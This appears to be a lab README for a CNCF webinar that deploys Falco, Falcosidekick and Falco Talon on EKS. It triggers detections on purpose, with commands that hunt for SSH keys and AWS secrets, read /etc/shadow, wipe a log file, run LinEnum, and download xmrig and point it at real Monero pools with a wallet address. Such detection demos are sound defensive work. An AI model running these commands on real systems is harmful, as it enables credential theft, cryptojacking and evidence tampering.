# Falcosidekick-Talon-CNCF
CNCF webinar to discuss Falcosidekick and how it integrates with Falco Talon as an output channel.

Set up an ```AWS-CLI Profile``` in order to interact with AWS services via my local workstation
```
aws configure --profile nigel-aws-profile
export AWS_PROFILE=nigel-aws-profile                                            
aws sts get-caller-identity --profile nigel-aws-profile
aws eks update-kubeconfig --region eu-west-1 --name falco-cluster
```

## Create EKS Cluster with Cilium CNI

```
eksctl create cluster --name falco-cluster --without-nodegroup
```

Once ```aws-node``` DaemonSet is deleted, EKS will not try to restore it.
```
kubectl -n kube-system delete daemonset aws-node
```

Setup Helm repository:
```
helm repo add cilium https://helm.cilium.io/
```

Deploy Cilium release via Helm:
```
helm install cilium cilium/cilium --version 1.9.18 \
  --namespace kube-system \
  --set eni=true \
  --set ipam.mode=eni \
  --set egressMasqueradeInterfaces=eth0 \
  --set tunnel=disabled \
  --set nodeinit.enabled=true
```

Create a node group since there are no worker nodes for our pods
```
eksctl create nodegroup --cluster falco-cluster --node-type t3.xlarge --nodes 1 --nodes-min=0 --nodes-max=3 --max-pods-per-node 58
```

## Create EKS Cluster with AWS VPC CNI

```
eksctl create cluster --name falco-cluster --node-type t3.xlarge --nodes 1 --nodes-min=0 --nodes-max=3 --max-pods-per-node 58
```

## Create local directory for lab

```
mkdir vilnius-demo
```

```
cd vilnius-demo
```

## Install Falco and Falcosidekick

Docs Page: https://docs.falco-talon.org/docs/installation_usage/falcosidekick/

```
helm install falco falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false \
  --set falcosidekick.config.webhook.address=http://falco-talon:2803 \
  --set "falcoctl.config.artifact.install.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falcoctl.config.artifact.follow.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falco.rules_file={/etc/falco/falco_rules.yaml,/etc/falco/falco-incubating_rules.yaml,/etc/falco/falco-sandbox_rules.yaml,/etc/falco/rules.d}" \
  -f custom-rules.yaml
```

## Falco Detections Before Falcosidekick UI
Shell into a Kubernetes workload:
```
kubectl exec -it dodgy-pod -- bash
```
To do so, let's simulate someone trying to sniff for SSH keys. <br/>
Run find on the root home dir, querying for "```id_rsa```" <br/>
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=55941ff25a7d8c6253b5a17e4ed20d30
```
find /root -name "id_rsa"
```
Print to stdout the logs with:
```
kubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Warning Grep private keys'
```

An attempt to read any sensitive file (e.g. files containing user/password/authentication information). <br/>
In modern containerized cloud infrastructures, accessing traditional Linux sensitive files might be less relevant, yet it remains valuable for baseline detections. <br/>
While we provide additional rules for SSH or cloud vendor-specific credentials, you can significantly enhance your security program by crafting custom rules for critical application credentials unique to your environment.

```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=5116b3ca0c5fad246cc41ca67938a315
```
cat /etc/shadow > /dev/null
```

```
kubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Read sensitive file untrusted'
```


## Create an insecure workload

```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
```
In the second window, run:
```
kubectl get events -n default
```
In the third window, check for Label changes in realtime:
```
kubectl get pods -n default --show-labels -w
```
You can remove the labels manually via ```kubectl edit``` command:
```
kubectl edit pod dodgy-pod -n default
```

Back in the first window, run: <br/>
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=1a24c2ccf3a790d0c04e3858f7439ab4 <br/>
```Action:``` https://docs.falco-talon.org/docs/actionners/list/#kuberneteslabelize
```
kubectl exec -it dodgy-pod -- bash
```
Download the miner from Github
```
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```
Unzip xmrig package:
```
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
```
```
cd xmrig-6.16.4
```
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=3f01c102c6d26af968d5eb6b6777085d
```
./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
```
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=b22719ac071b8de3c7e0ec92dcab21cb <br/>
```Action:``` https://docs.falco-talon.org/docs/actionners/list/#kubernetesnetworkpolicy
```
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
```
```
kubectl get networkpolicies -n default
```
```
kubectl get networkpolicies dodgy-pod -n default -o yaml
```
```
kubectl delete networkpolicy dodgy-pod
```


## Testing the Script response action

Copy file from a container and trigger a ```Kubernetes Client Tool Launched in Container``` detection in Falco: <br/>
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=bc5091ab0698e22b68d788e490e8eb66

```
kubectl cp dodgy-pod:xmrig-6.16.4-linux-static-x64.tar.gz ~/desktop/xmrig-6.16.4-linux-static-x64.tar.gz
```


## Enforce Network Policy on Suspicious Traffic

```
kubectl exec -it dodgy-pod -- bash
```

```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=0d2e8a0dd3369a030f7acfaab682ad92 <br/>
```Action:``` https://docs.falco-talon.org/docs/actionners/list/#kubernetesterminate
```
curl 52.21.188.179
```

Check to confirm the pod was gracefully terminates
```
kubectl get pods -n default
```

## Pod Run as Root User

```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=353fe5313eb9fe14878f7eaae04550a3
```
kubectl run nigelroot --image=alpine --restart=Never --rm -it -- /bin/sh -c 'echo "Tampering with log file" > /var/log/access.log; cat /dev/null > /var/log/access.log'
```


## Expose the Falcosidekick UI
```
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802 --insecure-skip-tls-verify
```

Scale down the cluster
```
eksctl get nodegroups --cluster falco-cluster
```
```
eksctl scale nodegroup --cluster falco-cluster --name ng-e8f763e7 --nodes 0
```

Kubecolor
```
alias kubectl="kubecolor"
```

Upgrade of Falco and Falcosidekick
```
helm upgrade falco falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false \
  --set falcosidekick.config.webhook.address=http://falco-talon:2803 \
  --set "falcoctl.config.artifact.install.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falcoctl.config.artifact.follow.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falco.rules_file={/etc/falco/falco_rules.yaml,/etc/falco/falco-incubating_rules.yaml,/etc/falco/falco-sandbox_rules.yaml,/etc/falco/rules.d}" \
  -f custom-rules.yaml
```

## Screenshots

<img width="1409" alt="Screenshot 2024-02-19 at 16 39 22" src="https://github.com/nigel-falco/Falcosidekick-Talon-CNCF/assets/152274017/e98bc132-e218-4e34-9c77-09263ea335b4">

<img width="1434" alt="Screenshot 2024-02-19 at 17 13 55" src="https://github.com/nigel-falco/Falcosidekick-Talon-CNCF/assets/152274017/6d607be7-51c5-4f5c-95fb-7d39a155a47c">

<img width="1434" alt="Screenshot 2024-02-19 at 17 14 08" src="https://github.com/nigel-falco/Falcosidekick-Talon-CNCF/assets/152274017/51cadfb8-3945-42cf-a194-751106e1ae15">


## Vilnius Demonstration

Before installing any chart provided by this repository, add the [falcosecurity](https://github.com/falcosecurity/charts) Charts Repository:

```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
```

Before installing Falco, let's download a `custom-rules.yaml` file to disable noisy Falco rules

```bash
wget https://raw.githubusercontent.com/nigel-falco/oss-security-workshop/main/runtime-security/custom-rules.yaml
```

Finally, proceed to install the Falco chart with the `-f` flag for the custom-rules.yaml file.

```bash
helm install falco falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false \
  --set falcosidekick.config.webhook.address=http://falco-talon:2803 \
  --set "falcoctl.config.artifact.install.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falcoctl.config.artifact.follow.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falco.rules_file={/etc/falco/falco_rules.yaml,/etc/falco/falco-incubating_rules.yaml,/etc/falco/falco-sandbox_rules.yaml,/etc/falco/rules.d}" \
  -f custom-rules.yaml
```

This environment is using containerd instead of docker,
this is why the collector is available in a different socket
(The feature flag `--set tty=true` ensures we receive Falco alerts in real-time).

Track the progress of the Falco deployment until you see `READY: 2/2` and `STATUS: Running`:
```bash
kubectl get pods -n falco -w
```

Progress with the lab when the below command confirms `pod/<pod_name> condition met`:
```bash
kubectl wait pods --for=condition=Ready -l app.kubernetes.io/name=falco -n falco --timeout=150s
```

Once the pod is ready, run the following command to see the logs:
```bash
kubectl logs -l app.kubernetes.io/name=falco -n falco -c falco
```

The logs confirm that Falco and its rules have been loaded correctly into the [Linux Kernel](https://en.wikipedia.org/wiki/Linux_kernel).

Trigger a Falco Detection
===

Run the following command to trigger one of the [Falco rules](https://thomas.labarussias.fr/falco-rules-explorer/):
```bash
find /root -name "id_rsa"
```

Check that Falco correctly intercepted the potentially dangerous command:
```bash
kubectl logs -l app.kubernetes.io/name=falco -n falco -c falco | grep "find /root -name id_rsa"
```


Install Falco Talon
===

Git clone is used to target and create a copy of the [falco-talon](https://docs.falco-talon.org/docs/installation_usage/helm/) repository:
```bash
git clone https://github.com/falco-talon/falco-talon.git
```

Once downloaded, change directory to the Helm folder before running the ***helm install*** command:
```bash
cd falco-talon/deployment/helm/
```

Remove (rm) the existing, default rules file:
```
rm rules.yaml
```

Download the updated Talon rule:
```
wget https://raw.githubusercontent.com/nigel-falco/oss-security-workshop/main/runtime-security/rules.yaml
```

Install Falco Talon with the newly-modified rules file
```
helm install falco-talon . -n falco
```

If the falco-talon pods are running, we can progress to the next lab scenario:
```bash
kubectl get pods -n falco -w
```

If Talon is up-and-running, let's proceed to the next task!
You can of course uninstall Falco Talon at any time with no associated downtime for Falco:

```
helm uninstall falco-talon -n falco
```

Let's test Falco Talon
===

In the **Check Events** tab, let's watch for events in the **default** namespace
```
kubectl get events -n default -w
```

Let's create the Ubuntu pod in the original **Terminal** window:
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/oss-security-workshop/main/k03-rbac/ubuntu-pod.yaml
```

Back in the ***Ubuntu Pod*** tab, shell into a container with label ***app=ubuntu*** (Talon should add the **new labels in Check Events tab**):
```
kubectl exec -it $(kubectl get pods -l app=ubuntu -o jsonpath='{.items[0].metadata.name}') -- /bin/bash
```

If you don't see the appropriate output in the 'Events' tab, check the Talon logs:
```
kubectl logs -n falco -l app.kubernetes.io/instance=falco-talon --max-log-requests=10
```

This proves that Talon is working !!!

Let's mitigate threats with Falco Talon
===

In **Check Events** tab, we should be still watching for events in the **default** namespace
```
kubectl get events -n default -w
```
In ***Falco Talon*** tab, let's install a cryptominer and use the stratum protocol to force the packet capture
```
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```
```
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
```
```
cd xmrig-6.16.4
```
Communicate with the ```known cryptomining C2 servers``` directly:
```
./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
```
```
./xmrig-6.16.4# ./xmrig --donate-level 8 -o 47.115.41.163:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
```

Or trigger a Falco detect based on the ```Stratum protocol``` usage:
```
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
```

## Helm Stuff for Labs
```
helm list --all-namespaces
```

```
helm uninstall -n sysdig-agent    sysdig-agent
```

## Test commands for demo purposes

Find AWS Credentials
```
grep "aws_secret_access_key" /path/to/some/file
```

Read sensitive file untrusted
```
sudo cat /etc/shadow > /dev/null
```

Kubernetes Client Tool Launched in Container
```
apt-get update
apt-get install -y curl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
mv kubectl /usr/local/bin/
kubectl version --client
```

Detect reconnaissance scripts
```
bash -c ./LinEnum.sh
```

Sysdig agent helm installation
```
helm repo add sysdig https://charts.sysdig.com
helm repo update
helm install sysdig-agent --namespace sysdig-agent --create-namespace \
    --set global.sysdig.accessKey=**** \
    --set global.sysdig.region=us2 \
    --set nodeAnalyzer.secure.vulnerabilityManagement.newEngineOnly=true \
    --set global.kspm.deploy=true \
    --set clusterShield.enabled=true \
    --set kspmCollector.enabled=false \
    --set clusterScanner.enabled=false \
    --set admissionController.enabled=false \
    --set global.clusterConfig.name=nigel-dora-cluster \
    --set nodeAnalyzer.nodeAnalyzer.runtimeScanner.deploy=false \
    --set nodeAnalyzer.nodeAnalyzer.benchmarkRunner.deploy=false \
    --set clusterShield.cluster_shield.features.admission_control.enabled=true \
    --set clusterShield.cluster_shield.features.container_vulnerability_management.enabled=true \
    --set clusterShield.cluster_shield.features.audit.enabled=true \
    --set clusterShield.cluster_shield.features.posture.enabled=true \
    sysdig/sysdig-deploy
```
